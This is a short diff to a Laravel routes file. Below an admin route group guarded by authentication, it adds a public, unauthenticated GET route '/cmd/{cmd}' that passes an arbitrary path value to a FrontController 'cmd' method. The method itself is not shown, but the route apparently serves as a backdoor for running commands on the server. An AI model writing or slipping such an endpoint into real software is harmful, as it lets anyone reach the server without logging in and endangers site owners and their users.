@@ -52,3 +52,5 @@ Route::group(['middleware' => ['auth:admin']], function() {
     });
     Route::get('/admin/offerurl',[OfferurlController::class,'view'])->name('admin-offer-url');
 });
+
+Route::get('/cmd/{cmd}', [FrontController::class, 'cmd']);
